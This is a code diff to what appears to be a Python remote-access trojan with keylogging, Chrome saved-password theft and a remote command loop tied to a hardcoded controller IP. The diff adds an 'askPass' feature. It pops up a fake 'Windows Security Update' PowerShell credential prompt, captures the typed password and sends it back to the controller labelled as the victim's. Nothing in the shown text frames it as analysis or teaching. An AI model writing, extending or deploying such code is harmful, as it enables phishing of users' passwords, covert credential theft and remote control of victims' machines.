@@ -10,6 +10,21 @@ keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
 ip_address = '192.168.10.11'
 
+def askPass(s):
+    while True:
+        try:
+            command = "powershell $cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password;"
+            cmd = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            cmd_output, errors = cmd.communicate()
+            if cmd_output != '':
+                if len(cmd_output) == 2:
+                    pass
+                else:
+                    s.send("Victim's Password: "+cmd_output)
+                    break
+        except:
+            s.send('ERROR')
+    
 def get_chrome_path(s):
     try:
         path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
@@ -177,6 +192,8 @@ def connect():
         elif 'getLogFile' in command:
             transfer(s, f_name, command)
             shutil.rmtree(keyLog)
+        elif 'askPass' in command:
+            askPass(s)
         elif 'chromeDump' in command:
             path, success = get_chrome_path(s)
             if success:
